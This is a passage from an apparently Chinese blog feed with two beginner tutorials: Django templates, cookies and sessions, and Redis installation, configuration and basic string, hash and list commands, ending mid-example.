准备模板文件目录</strong></p></blockquote><ul><li>在工程根目录下创建模板文件目录<strong><code>templates</code></strong></li></ul><blockquote><p><strong>1.2 配置模板</strong></p></blockquote><ul><li><p>在</p><pre><code>settings.py</code></pre><p>配置文件中修改</p><p><code>TEMPLATES</code></p><p>配置项的</p><p><code>DIRS</code></p><p>值：</p><pre><code class="python"># 配置模板TEMPLATES = [  {      &#39;BACKEND&#39;: &#39;django.template.backends.django.DjangoTemplates&#39;,      #指定模板文件目录的路径      &#39;DIRS&#39;: [os.path.join(BASE_DIR, &#39;templates&#39;)],      &#39;APP_DIRS&#39;: True,      &#39;OPTIONS&#39;: {          &#39;context_processors&#39;: [              &#39;django.template.context_processors.debug&#39;,              &#39;django.template.context_processors.request&#39;,              &#39;django.contrib.auth.context_processors.auth&#39;,              &#39;django.contrib.messages.context_processors.messages&#39;,          ],      },  },]</code></pre></li></ul><h3 id="2-定义和响应模板"><a href="#2-定义和响应模板" class="headerlink" title="2. 定义和响应模板"></a>2. 定义和响应模板</h3><blockquote><p><strong>2.1 新建模板文件</strong></p></blockquote><ul><li>在<code>templates</code>目录中新建一个模板文件，如：<code>temp.html</code></li></ul><blockquote><p><strong>2.2 响应模板文件</strong></p></blockquote><pre><code class="python">class TempView(View):    &quot;&quot;&quot;图书信息    http://127.0.0.1:8000/temp/    &quot;&quot;&quot;    def get(self, request):        return render(request, &#39;temp.html&#39;)</code></pre><h3 id="3-测试模板渲染"><a href="#3-测试模板渲染" class="headerlink" title="3. 测试模板渲染"></a>3. 测试模板渲染</h3><blockquote><p><strong>3.1 模板语法</strong></p></blockquote><ul><li><p>模板语法如下：</p><ul><li><p>变量名必须由字母、数字、下划线（不能以下划线开头）和点组成</p></li></ul></li></ul><blockquote><p><strong>3.2 使用模板语法渲染HTML模板</strong></p></blockquote><pre><code class="python">class BooksView(View):    &quot;&quot;&quot;图书信息    http://127.0.0.1:8000/books/    &quot;&quot;&quot;    def get(self, request):        # 构造上下文        context = {            &#39;name&#39;: &#39;张三&#39;,            &#39;age&#39;: 18        }        # 使用上下文渲染&#39;book.html&#39;，并返回给客户端        return render(request, &#39;book.html&#39;, context)</code></pre><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;图书信息页&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;h1&gt;{{ name }}&lt;/h1&gt;    &lt;h1&gt;{{ age }}&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="4-数据库数据渲染模板"><a href="#4-数据库数据渲染模板" class="headerlink" title="4. 数据库数据渲染模板"></a>4. 数据库数据渲染模板</h3><blockquote><p>需求：</p></blockquote><ul><li>渲染数据库中所有的图书信息</li></ul><pre><code class="python">class BooksView(View):    &quot;&quot;&quot;测试模板    http://127.0.0.1:8000/books/    &quot;&quot;&quot;    def get(self, request):        # 查询所有图书信息        books = BookInfo.objects.all()        # 构造上下文        context = {            &#39;books&#39;: books        }        # 使用上下文渲染&#39;book.html&#39;，并返回给客户端        return render(request, &#39;books.html&#39;, context)</code></pre><pre><code class="html">&lt;body&gt;    &lt;ul&gt;        {% for book in books %}            <li>《{{ book.btitle }}》</li>        {% endfor %}    &lt;/ul&gt;&lt;/body&gt;</code></pre><h2 id="五、cookie和session"><a href="#五、cookie和session" class="headerlink" title="五、cookie和session"></a>五、cookie和session</h2><p>提示：</p><blockquote><ul><li>Cookie和Session是Django程序中用来缓存数据的</li></ul></blockquote><p><strong>经验值分享</strong></p><p><strong>1. 状态保持和Cookie、Session的关系</strong></p><p>提示：</p><ul><li>容易出现的误解：状态保持就是Cookie和Session，Cookie和Session就是状态保持。</li><li>状态保持和Cookie、Session是两种不同的概念，需要区分开，不能混淆。</li></ul><p><strong>状态保持：</strong></p><pre><code>* 用于记录当前用户的状态，比如，用户登录后记录登录的状态。</code></pre><p><strong>Cookie、Session：</strong></p><pre><code>* Cookie、Session仅仅是Django提供的缓存机制而已，用于缓存数据的。* 比如：    * Cookie和Session缓存购物车数据    * Cookie和Session缓存用户登录状态 (状态保持)</code></pre><p><strong>状态保持和Cookie、Session的关系</strong></p><pre><code>* Cookie和Session仅仅是状态保持的一种实现方式而已* 而能够实现状态保持的方式不仅仅只有Cookie和Session，比如JWT也可以实现状态保持</code></pre><h3 id="1-cookie"><a href="#1-cookie" class="headerlink" title="1.cookie"></a>1.cookie</h3><blockquote><p><strong>提示：</strong></p></blockquote><ul><li><strong>HTTP协议本身是无状态的</strong>，即服务器无法判断用户身份。</li></ul><blockquote><p>问题：</p></blockquote><ul><li>服务器默认是无法识别当前登录用户是谁的，即<strong>无法记住登录状态</strong>。</li></ul><blockquote><p>解决：</p></blockquote><ul><li><strong><code>Cookie</code></strong></li><li>我们可以使用Cookie机制记住用户的登录状态</li></ul><h4 id="1-1-Cookie的介绍"><a href="#1-1-Cookie的介绍" class="headerlink" title="1.1 Cookie的介绍"></a>1.1 Cookie的介绍</h4><ul><li>Cookie，最早是网景公司的前雇员 Lou Montulli 在 1993 年 3 月发明的。</li><li>Cookie，指某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）。</li><li><strong>Cookie，实际上是一小段存储在用户浏览器中的文本信息</strong>。</li></ul><blockquote><p><strong>Cookie的机制：</strong></p></blockquote><ul><li>客户端向服务器发起请求，如果服务器需要记录该用户状态，就通过响应向客户端浏览器颁发一个Cookie。<ul><li>该Cookie中需要包含用户的唯一标识信息</li></ul></li><li>客户端浏览器会把Cookie保存起来。</li><li>当浏览器再次请求该网站时，浏览器把请求的网址连同该Cookie一同提交给服务器。</li><li>服务器检查该Cookie，以此来辨认用户状态。</li></ul><blockquote><p><strong>Cookie的特点：</strong></p></blockquote><ul><li><p>Cookie，以键值对<strong><code>Key-Value</code></strong>形式进行信息的存储</p></li><li><p>Cookie，基于域名安全，不同域名的</p><p><code>Cookie</code></p><p>是不能互相访问的</p><ul><li>例如： 保存在<code>www.baidu.com</code>域名下面的<code>Cookie</code>是不能被其他域名访问的</li></ul></li><li><p>Cookie，它会自动跟随当前的请求传递到对应域名所在的服务器中。</p></li></ul><h4 id="2-2-操作Cookie"><a href="#2-2-操作Cookie" class="headerlink" title="2.2 操作Cookie"></a>2.2 操作Cookie</h4><blockquote><p>提示：</p></blockquote><ul><li>关于操作Cookie，分为<strong>设置Cookie</strong>和<strong>读取Cookie</strong></li></ul><h5 id="2-2-1-设置Cookie"><a href="#2-2-1-设置Cookie" class="headerlink" title="2.2.1 设置Cookie"></a>2.2.1 设置Cookie</h5><p>可以通过<strong>HttpResponse()</strong>对象中的<strong><code>set_cookie()</code></strong>方法来设置Cookie。</p><pre><code class="python"># 创建响应对象response = HttpResponse()# 使用响应对象设置Cookieresponse.set_cookie(key, value, max_age=cookie有效期)</code></pre><ul><li><strong>响应对象</strong>：常见的构造响应对象的方式<ul><li><strong><code>HttpResponse()</code></strong>：响应多种数据类型</li><li><strong><code>JsonResponse()</code></strong>：响应JSON</li><li><strong><code>redirect()</code></strong>：重定向</li><li><strong><code>render()</code></strong>：渲染并响应HTML模板</li></ul></li><li><strong>max_age</strong>：单位为秒，默认为<strong>None</strong>。<ul><li>如果是临时Cookie，可将<code>max_age</code>设置为<code>None</code>。</li><li>如果是有具体有效期的Cookie，可将<code>max_age</code>设置为<code>具体的秒数</code>。</li></ul></li></ul><p>示例：</p><pre><code class="python">class BooksView(View):    &quot;&quot;&quot;测试模板    http://127.0.0.1:8000/books/    &quot;&quot;&quot;    def get(self, request):        # 查询所有图书信息        books = BookInfo.objects.all()        # 构造上下文        context = {            &#39;books&#39;: books        }        # 使用上下文渲染&#39;book.html&#39;，并返回给客户端        response = render(request, &#39;books.html&#39;, context)        # 设置Cookie        response.set_cookie(&#39;name&#39;, &#39;itcast&#39;, max_age=None)        # 响应结果，并写Cookie到浏览器        return response</code></pre><h5 id="2-2-2-读取Cookie"><a href="#2-2-2-读取Cookie" class="headerlink" title="2.2.2 读取Cookie"></a>2.2.2 读取Cookie</h5><p>可以通过<strong>HttpRequest</strong>对象的<strong><code>COOKIES</code></strong>属性来读取本次请求携带的cookie值。</p><pre><code class="python">class TestCookieView(View):    &quot;&quot;&quot;测试Cookie    http://127.0.0.1:8000/cookies/    &quot;&quot;&quot;    def get(self, request):        # 读取Cookie        name = request.COOKIES.get(&#39;name&#39;)        print(name)        return http.HttpResponse(&#39;测试Cookie&#39;)</code></pre><h3 id="2-session"><a href="#2-session" class="headerlink" title="2.session"></a>2.session</h3><h4 id="2-1-Session的介绍"><a href="#2-1-Session的介绍" class="headerlink" title="2.1.Session的介绍"></a>2.1.Session的介绍</h4><ul><li><p>Session，是一种会话控制方式。由服务端创建，并且保存在服务端的数据存储形式。</p></li><li><p>Session，内部也是以<strong><code>key-value</code></strong> 键值对的形式存储数据。</p></li><li><p>Session，有些内容会被加密，所以可以存储敏感信息。</p></li><li><p>处理Session数据的子应用：</p></li><li><pre><code>INSTALLED_APPS = [    &#39;django.contrib.admin&#39;,    &#39;django.contrib.auth&#39;,    &#39;django.contrib.contenttypes&#39;,    &#39;django.contrib.sessions&#39;,       &lt;============    &#39;django.contrib.messages&#39;,    &#39;django.contrib.staticfiles&#39;,</code></pre></li></ul><p>处理Session的中间件：</p><pre><code>MIDDLEWARE = [    &#39;django.middleware.security.SecurityMiddleware&#39;,    &#39;django.contrib.sessions.middleware.SessionMiddleware&#39;,     &lt;==============    &#39;django.middleware.common.CommonMiddleware&#39;,    # &#39;django.middleware.csrf.CsrfViewMiddleware&#39;,    &#39;django.contrib.auth.middleware.AuthenticationMiddleware&#39;,    &#39;django.contrib.messages.middleware.MessageMiddleware&#39;,    &#39;django.middleware.clickjacking.XFrameOptionsMiddleware&#39;,]</code></pre><p>PS：如需禁用Session，将上图中的session中间件注释掉即可。</p><blockquote><p><strong>Session的机制：</strong></p></blockquote><ul><li>客户端向服务器发起请求，如果服务器需要记录该用户状态，就可以通过Session在服务端将该用户的唯一标识信息存储起来。<ul><li><strong><code>session_key</code></strong>：一个随机的唯一的不重复的字符串</li><li><strong><code>session_data</code></strong>：用户的唯一标识信息（密文）</li></ul></li><li>然后，服务端会向客户端浏览器颁发一个Cookie。<ul><li>该Cookie中包含了Session存储数据时使用的那个<strong><code>session_key</code></strong></li><li>该Cookie的具体形式为：<strong><code>&#39;session_id&#39;: &#39;session_key&#39;</code></strong></li></ul></li><li>当浏览器再次请求该网站时，浏览器把请求的网址连同该Cookie一同提交给服务器。</li><li>服务器提取该Cookie中的<strong><code>session_key</code></strong>，再使用它提取<strong><code>session_data</code></strong>。</li><li>最后使用<strong><code>session_data</code></strong>来辨认用户状态</li></ul><blockquote><p><strong>Session的特点：</strong></p></blockquote><ul><li>存储敏感、重要的信息<ul><li>因为session数据是存储在服务端的，不会直接暴露给用户</li></ul></li><li>相比较Cookie可以存储更多的内容<ul><li>不同的浏览器，对Cookie都有不同的数量和大小的限制</li></ul></li><li>依赖于Cookie<ul><li>因为<strong><code>session_key</code></strong>需要存储在Cookie中</li></ul></li><li>Session共享<ul><li>利用独立部署的session服务器（集群）统一管理Session，服务器每次读写Session时，都访问Session服务器。</li></ul></li></ul><h4 id="2-2-操作Session"><a href="#2-2-操作Session" class="headerlink" title="2.2 操作Session"></a>2.2 操作Session</h4><blockquote><p>提示：</p></blockquote><ul><li>对于Session的操作，分为<strong><code>设置Session</code></strong>和<strong><code>读取session</code></strong></li></ul><h5 id="2-2-1-设置Session"><a href="#2-2-1-设置Session" class="headerlink" title="2.2.1 设置Session"></a>2.2.1 设置Session</h5><p>可以通过<strong>HttpRequest()</strong>对象中的<strong><code>session</code></strong>属性来设置Session。</p><pre><code class="python">request.session[&#39;key&#39;] = valueclass BooksView(View):    &quot;&quot;&quot;测试模板    http://127.0.0.1:8000/books/    &quot;&quot;&quot;    def get(self, request):        # 查询所有图书信息        books = BookInfo.objects.all()        # 构造上下文        context = {            &#39;books&#39;: books        }        # 使用上下文渲染&#39;book.html&#39;，并返回给客户端        response = render(request, &#39;books.html&#39;, context)        # 设置Cookie        response.set_cookie(&#39;name&#39;, &#39;itcast&#39;, max_age=3600)        # 设置Session        request.session[&#39;name&#39;] = &#39;itcast&#39;        # 响应结果，并写Cookie到浏览器        return response</code></pre><h5 id="2-2-2-读取Session"><a href="#2-2-2-读取Session" class="headerlink" title="2.2.2 读取Session"></a>2.2.2 读取Session</h5><p>根据键读取值</p><pre><code class="python">request.session.get(&#39;key&#39;, 默认值)class TestSessionView(View):    &quot;&quot;&quot;测试Session    http://127.0.0.1:8000/session/    &quot;&quot;&quot;    def get(self, request):        # 读取Session        name = request.session.get(&#39;name&#39;)        print(name)        return http.HttpResponse(&#39;测试Session&#39;)</code></pre><h5 id="2-2-3-操作Session的其他方式"><a href="#2-2-3-操作Session的其他方式" class="headerlink" title="2.2.3 操作Session的其他方式"></a>2.2.3 操作Session的其他方式</h5><blockquote><p>清除所有Session，在存储中删除值部分。</p></blockquote><pre><code class="python">request.session.clear()</code></pre><blockquote><p>清除session数据，在存储中删除session的整条数据。</p></blockquote><pre><code class="python">request.session.flush()</code></pre><blockquote><p>删除session中的指定键及值，在存储中只删除某个键及对应的值。</p></blockquote><pre><code class="python">del request.session[&#39;key&#39;]</code></pre><blockquote><p>设置session的有效期</p></blockquote><pre><code class="python">request.session.set_expiry(value)</code></pre><ul><li>如果value是一个整数，session将在value秒没有活动后过期。</li><li>如果value为0，那么用户session的Cookie将在用户的浏览器关闭时过期。</li><li>如果value为None，那么session有效期将采用系统默认值，默认为两周。<ul><li>可以通过在settings.py中设置SESSION_COOKIE_AGE来设置全局默认值。</li></ul></li></ul><h4 id="2-3-Session数据存储的位置"><a href="#2-3-Session数据存储的位置" class="headerlink" title="2.3 Session数据存储的位置"></a>2.3 Session数据存储的位置</h4><h5 id="2-3-1-默认的存储位置"><a href="#2-3-1-默认的存储位置" class="headerlink" title="2.3.1 默认的存储位置"></a>2.3.1 默认的存储位置</h5><blockquote><p>Session数据默认存储的位置是在<code>settings.py</code>的<code>DATABASES</code>配置项指定的SQL数据库中</p></blockquote><ul><li><p>因为Session引擎默认的配置为：</p><pre><code class="python">SESSION_ENGINE = &#39;django.contrib.sessions.backends.db&#39;</code></pre></li></ul><h5 id="2-3-2-本地缓存"><a href="#2-3-2-本地缓存" class="headerlink" title="2.3.2 本地缓存"></a>2.3.2 本地缓存</h5><p>存储在本机内存中，如果丢失则不能找回，比数据库的方式读写更快。</p><pre><code class="python">SESSION_ENGINE=&#39;django.contrib.sessions.backends.cache&#39;</code></pre><h5 id="2-3-3-混合存储"><a href="#2-3-3-混合存储" class="headerlink" title="2.3.3 混合存储"></a>2.3.3 混合存储</h5><p>优先从本机内存中存取，如果没有则从数据库中存取。</p><pre><code class="python">SESSION_ENGINE=&#39;django.contrib.sessions.backends.cached_db&#39;</code></pre><h5 id="2-3-4-Redis"><a href="#2-3-4-Redis" class="headerlink" title="2.3.4 Redis"></a>2.3.4 Redis</h5><p>在Redis中保存Session，需要引入第三方扩展，我们可以使用<strong>django-redis</strong>来解决。</p><p>1）安装扩展</p><pre><code class="python">pip install django-redis</code></pre><p>2）配置</p><p>在settings.py文件中做如下设置</p><pre><code class="python">CACHES = {    &quot;default&quot;: {        &quot;BACKEND&quot;: &quot;django_redis.cache.RedisCache&quot;,        &quot;LOCATION&quot;: &quot;redis://127.0.0.1:6379/1&quot;,        &quot;OPTIONS&quot;: {            &quot;CLIENT_CLASS&quot;: &quot;django_redis.client.DefaultClient&quot;,        }    }}SESSION_ENGINE = &quot;django.contrib.sessions.backends.cache&quot;SESSION_CACHE_ALIAS = &quot;default&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis</title>
      <link href="/2020/09/21/2020-09-22-redis/"/>
      <url>/2020/09/21/2020-09-22-redis/</url>
      
        <content type="html"><![CDATA[<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><h3 id="nosql介绍"><a href="#nosql介绍" class="headerlink" title="nosql介绍"></a>nosql介绍</h3><h3 id="NoSQL：一类新出现的数据库-not-only-sql"><a href="#NoSQL：一类新出现的数据库-not-only-sql" class="headerlink" title="NoSQL：一类新出现的数据库(not only sql)"></a>NoSQL：一类新出现的数据库(not only sql)</h3><a id="more"></a><ul><li>泛指非关系型的数据库</li><li>不支持SQL语法</li><li>存储结构跟传统关系型数据库中的那种关系表完全不同，nosql中存储的数据都是KV形式</li><li>NoSQL的世界中没有一种通用的语言，每种nosql数据库都有自己的api和语法，以及擅长的业务场景</li><li>NoSQL中的产品种类相当多：<ul><li>Redis</li><li>Mongodb</li><li>Hbase hadoop</li><li>Cassandra hadoop</li></ul></li></ul><h3 id="NoSQL和SQL数据库的比较："><a href="#NoSQL和SQL数据库的比较：" class="headerlink" title="NoSQL和SQL数据库的比较："></a>NoSQL和SQL数据库的比较：</h3><ul><li>适用场景不同：sql数据库适合用于关系特别复杂的数据查询场景，nosql反之</li><li><strong>事务</strong> 特性的支持：sql对事务的支持非常完善，而nosql基本不支持事务</li><li>两者在不断地取长补短，呈现融合趋势</li></ul><h3 id="Redis简介"><a href="#Redis简介" class="headerlink" title="Redis简介"></a>Redis简介</h3><ul><li>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助。</li><li>Redis是 NoSQL技术阵营中的一员，它通过多种键值数据类型来适应不同场景下的存储需求，借助一些高层级的接口使用其可以胜任，如缓存、队列系统的不同角色</li></ul><h3 id="Redis特性"><a href="#Redis特性" class="headerlink" title="Redis特性"></a>Redis特性</h3><ul><li>Redis 与其他 key - value 缓存产品有以下三个特点：</li><li>Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。</li><li>Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。</li><li>Redis支持数据的备份，即master-slave模式的数据备份。</li></ul><h3 id="Redis-优势"><a href="#Redis-优势" class="headerlink" title="Redis 优势"></a>Redis 优势</h3><ul><li>性能极高 – Redis能读的速度是110000次/s,写的速度是81000次/s 。</li><li>丰富的数据类型 – Redis支持二进制案例的 Strings, Lists, Hashes, Sets 及 Ordered Sets 数据类型操作。</li><li>原子 – Redis的所有操作都是原子性的，同时Redis还支持对几个操作全并后的原子性执行。</li><li>丰富的特性 – Redis还支持 publish/subscribe, 通知, key 过期等等特性。</li></ul><h3 id="Redis应用场景"><a href="#Redis应用场景" class="headerlink" title="Redis应用场景"></a>Redis应用场景</h3><ul><li>用来做缓存(ehcache/memcached)——redis的所有数据是放在内存中的（内存数据库）</li><li>可以在某些特定应用场景下替代传统数据库——比如社交类的应用</li><li>在一些大型系统中，巧妙地实现一些特定的功能：session共享、购物车</li><li>只要你有丰富的想象力，redis可以给你无限的惊喜…….</li></ul><h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><p>官网：<a href="http://download.redis.io/releases/redis-6.0.8.tar.gz" target="_blank" rel="noopener">http://download.redis.io/releases/redis-6.0.8.tar.gz</a>      </p><p><strong>安装方法一：源码编译安装</strong></p><p>step1:下载</p><blockquote><p>wget <a href="http://download.redis.io/releases/redis-6.0.8.tar.gz" target="_blank" rel="noopener">http://download.redis.io/releases/redis-6.0.8.tar.gz</a>      </p></blockquote><p>step2:解压</p><blockquote><p>tar zxf redis-6.0.8.tar.gz      </p></blockquote><p>step3:移动，放到usr/local⽬录下</p><blockquote><p>sudo mv ./redis-x.x.x /usr/local/redis/</p></blockquote><p>step4:进⼊redis⽬录</p><blockquote><p>cd /usr/local/redis/</p></blockquote><p>step5:生成</p><blockquote><p>sudo make</p></blockquote><p>step6:测试,这段运⾏时间会较⻓</p><blockquote><p>sudo make test</p></blockquote><p>step7:安装,将redis的命令安装到<code>/usr/local/bin/</code>⽬录</p><blockquote><p>sudo make install</p></blockquote><p>step8:安装完成后，我们进入目录<code>/usr/local/bin</code>中查看</p><blockquote><p>cd /usr/local/bin<br>ls -all</p></blockquote><ul><li>redis-server redis服务器</li><li>redis-cli redis命令行客户端</li><li>redis-benchmark redis性能测试工具</li><li>redis-check-aof AOF文件修复工具</li><li>redis-check-rdb RDB文件检索工具</li></ul><p>step9:配置⽂件，移动到<code>/etc/</code>⽬录下</p><ul><li><p>配置⽂件⽬录为<code>/usr/local/redis/redis.conf</code></p><blockquote><p>sudo cp /usr/local/redis/redis.conf /etc/redis/</p></blockquote></li></ul><p>安装方法二：</p><p>sudo apt install redis</p><h2 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h2><p><strong>提示：</strong></p><ul><li><p>Redis的配置信息在<code>/etc/redis/redis.conf</code>下。</p></li><li><p>查看</p><blockquote><p>sudo vi /etc/redis/redis.conf</p></blockquote></li></ul><h3 id="核心配置选项"><a href="#核心配置选项" class="headerlink" title="核心配置选项"></a>核心配置选项</h3><ul><li><p>绑定ip：如果需要远程访问，可将此⾏注释，或绑定⼀个真实ip</p><blockquote><p>bind 127.0.0.1</p></blockquote></li><li><p>端⼝，默认为6379</p><blockquote><p>port 6379</p></blockquote></li><li><p>是否以守护进程运⾏</p><ul><li>如果以守护进程运⾏，则不会在命令⾏阻塞，类似于服务</li><li>如果以⾮守护进程运⾏，则当前终端被阻塞</li><li>设置为yes表示守护进程，设置为no表示⾮守护进程</li><li>推荐设置为yes</li></ul><blockquote><p>daemonize yes</p></blockquote></li><li><p>数据⽂件</p><blockquote><p>dbfilename dump.rdb</p></blockquote></li><li><p>数据⽂件存储路径</p><blockquote><p>dir /var/lib/redis</p></blockquote></li><li><p>⽇志⽂件</p><blockquote><p>logfile “/var/log/redis/redis-server.log”</p></blockquote></li><li><p>数据库，默认有16个</p><blockquote><p>database 16</p></blockquote></li><li><p>主从复制，类似于双机备份。</p><blockquote><p>slaveof</p></blockquote></li></ul><h2 id="三、服务端和客户端命令"><a href="#三、服务端和客户端命令" class="headerlink" title="三、服务端和客户端命令"></a>三、服务端和客户端命令</h2><ul><li><h3 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h3></li><li><p>服务器端的命令为redis-server</p></li><li><p>可以使⽤help查看帮助⽂档</p><blockquote><p>redis-server –help</p></blockquote></li><li><p>个人习惯</p><blockquote><p>ps aux | grep redis 查看redis服务器进程<br>sudo kill -9 pid 杀死redis服务器<br>sudo redis-server /etc/redis/redis.conf 指定加载的配置文件</p></blockquote></li></ul><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><ul><li><p>客户端的命令为redis-cli</p></li><li><p>可以使⽤help查看帮助⽂档</p><blockquote><p>redis-cli –help</p></blockquote></li><li><p>连接redis</p><blockquote><p>redis-cli</p></blockquote></li><li><p>运⾏测试命令</p><blockquote><p>ping</p></blockquote></li><li><p>切换数据库</p></li><li><p>数据库没有名称，默认有16个，通过0-15来标识，连接redis默认选择第一个数据库</p><blockquote><p>select 10</p></blockquote></li></ul><h2 id="四、数据操作"><a href="#四、数据操作" class="headerlink" title="四、数据操作"></a>四、数据操作</h2><h3 id="重要文档"><a href="#重要文档" class="headerlink" title="重要文档"></a>重要文档</h3><ul><li><a href="http://doc.redisfans.com/" target="_blank" rel="noopener">Redis 参考命令</a></li><li><a href="https://redis-py.readthedocs.io/en/latest/#indices-and-tables" target="_blank" rel="noopener">Redis 官方文档</a></li></ul><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><ul><li><p>redis是key-value的数据结构，每条数据都是⼀个键值对</p></li><li><p>键的类型是字符串</p></li><li><p>注意：键不能重复</p></li><li><p>值的类型分为五种：</p><ul><li>字符串string</li><li>哈希hash</li><li>列表list</li><li>集合set</li><li>有序集合zset</li></ul></li></ul><h3 id="数据操作行为"><a href="#数据操作行为" class="headerlink" title="数据操作行为"></a>数据操作行为</h3><ul><li>保存</li><li>修改</li><li>获取</li><li>删除</li></ul><p>点击中⽂官⽹查看命令⽂档<a href="http://redis.cn/commands.html" target="_blank" rel="noopener">http://redis.cn/commands.html</a></p><h3 id="1-string类型"><a href="#1-string类型" class="headerlink" title="1.string类型"></a>1.string类型</h3><ul><li>字符串类型是 Redis 中最为基础的数据存储类型，它在 Redis 中是二进制的，这便意味着该类型可以接受任何格式的数据，如JPEG图像数据或Json对象描述信息等。在Redis中字符串类型的Value最多可以容纳的数据长度是512M。</li></ul><h4 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h4><p>如果设置的键不存在则为添加，如果设置的键已经存在则修改</p><ul><li><p>设置键值</p><blockquote><p>set key value</p></blockquote></li><li><p>例1：设置键为<code>name</code>值为<code>itcast</code>的数据</p><blockquote><p>set name itcast</p></blockquote></li><li><p>设置键值及过期时间，以秒为单位</p><blockquote><p>setex key seconds value</p></blockquote></li><li><p>例2：设置键为<code>aa</code>值为<code>aa</code>过期时间为3秒的数据</p><blockquote><p>setex aa 3 aa</p></blockquote></li><li><p>设置多个键值</p><blockquote><p>mset key1 value1 key2 value2 …</p></blockquote></li><li><p>例3：设置键为<code>a1</code>值为<code>python</code>、键为<code>a2</code>值为<code>java</code>、键为<code>a3</code>值为<code>c</code></p><blockquote><p>mset a1 python a2 java a3 c</p></blockquote></li></ul><h4 id="获取"><a href="#获取" class="headerlink" title="获取"></a>获取</h4><ul><li><p>获取：根据键获取值，如果不存在此键则返回<code>nil</code></p><blockquote><p>get key</p></blockquote></li><li><p>例5：获取键<code>name</code>的值</p><blockquote><p>get name</p></blockquote></li><li><p>根据多个键获取多个值</p><blockquote><p>mget key1 key2 …</p></blockquote></li><li><p>例6：获取键<code>a1、a2、a3</code>的值</p><blockquote><p>mget a1 a2 a3</p></blockquote></li></ul><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><blockquote><p>del key</p></blockquote><h3 id="2-键命令"><a href="#2-键命令" class="headerlink" title="2.键命令"></a>2.键命令</h3><ul><li><p>查找键，参数⽀持正则表达式</p><blockquote><p>keys pattern</p></blockquote></li><li><p>例1：查看所有键</p><blockquote><p>keys *</p></blockquote></li><li><p>例2：查看名称中包含<code>a</code>的键</p><blockquote><p>keys a*</p></blockquote></li><li><p>判断键是否存在，如果存在返回<code>1</code>，不存在返回<code>0</code></p><blockquote><p>exists key1</p></blockquote></li><li><p>例3：判断键<code>a1</code>是否存在</p><blockquote><p>exists a1</p></blockquote></li><li><p>查看键对应的<code>value</code>的类型</p><blockquote><p>type key</p></blockquote></li><li><p>例4：查看键<code>a1</code>的值类型，为redis⽀持的五种类型中的⼀种</p><blockquote><p>type a1</p></blockquote></li><li><p>删除键及对应的值</p><blockquote><p>del key1 key2 …</p></blockquote></li><li><p>例5：删除键<code>a2、a3</code></p><blockquote><p>del a2 a3</p></blockquote></li><li><p>设置过期时间，以秒为单位</p></li><li><p>如果没有指定过期时间则⼀直存在，直到使⽤<code>DEL</code>移除</p><blockquote><p>expire key seconds</p></blockquote></li><li><p>例6：设置键<code>a1</code>的过期时间为3秒</p><blockquote><p>expire a1 3</p></blockquote></li><li><p>查看有效时间，以秒为单位</p><blockquote><p>ttl key</p></blockquote></li><li><p>例7：查看键<code>bb</code>的有效时间</p><blockquote><p>ttl bb</p></blockquote></li></ul><h3 id="3-hash"><a href="#3-hash" class="headerlink" title="3.hash"></a>3.hash</h3><ul><li><strong>hash</strong>⽤于存储对象，对象的结构为属性、值</li><li><strong>值</strong>的类型为<strong>string</strong></li></ul><h4 id="增加、修改"><a href="#增加、修改" class="headerlink" title="增加、修改"></a>增加、修改</h4><ul><li><p>设置单个属性</p><blockquote><p>hset key field value</p></blockquote></li><li><p>例1：设置键 <code>user</code>的属性<code>name</code>为<code>itheima</code></p><blockquote><p>hset user name itheima</p></blockquote></li><li><p>设置多个属性</p><blockquote><p>hmset key field1 value1 field2 value2 …</p></blockquote></li><li><p>例2：设置键<code>u2</code>的属性<code>name</code>为<code>itcast</code>、属性<code>age</code>为<code>11</code></p><blockquote><p>hmset u2 name itcast age 11</p></blockquote></li></ul><h4 id="获取-1"><a href="#获取-1" class="headerlink" title="获取"></a>获取</h4><ul><li><p>获取指定键所有的属性</p><blockquote><p>hkeys key</p></blockquote></li><li><p>例3：获取键u2的所有属性</p><blockquote><p>hkeys u2</p></blockquote></li><li><p>获取⼀个属性的值</p><blockquote><p>hget key field</p></blockquote></li><li><p>例4：获取键<code>u2</code>属性<code>name</code>的值</p><blockquote><p>hget u2 name</p></blockquote></li><li><p>获取多个属性的值</p><blockquote><p>hmget key field1 field2 …</p></blockquote></li><li><p>例5：获取键<code>u2</code>属性<code>name</code>、<code>age</code>的值</p><blockquote><p>hmget u2 name age</p></blockquote></li></ul><h4 id="删除-1"><a href="#删除-1" class="headerlink" title="删除"></a>删除</h4><ul><li><p><strong>删除整个hash键及值，使⽤del命令</strong></p></li><li><p>删除属性，属性对应的值会被⼀起删除</p><blockquote><p>hdel key field1 field2 …</p></blockquote></li><li><p>例7：删除键<code>u2</code>的属性<code>age</code></p><blockquote><p>hdel u2 age</p></blockquote></li></ul><h3 id="4-list"><a href="#4-list" class="headerlink" title="4.list"></a>4.list</h3><ul><li>列表的元素类型为string</li><li>按照插⼊顺序排序</li></ul><h4 id="增加"><a href="#增加" class="headerlink" title="增加"></a>增加</h4><ul><li><p>在左侧插⼊数据</p><blockquote><p>lpush key value1 value2 …</p></blockquote></li><li><p>例1：从键为<code>a1</code>的列表左侧加⼊数据<code>a 、 b 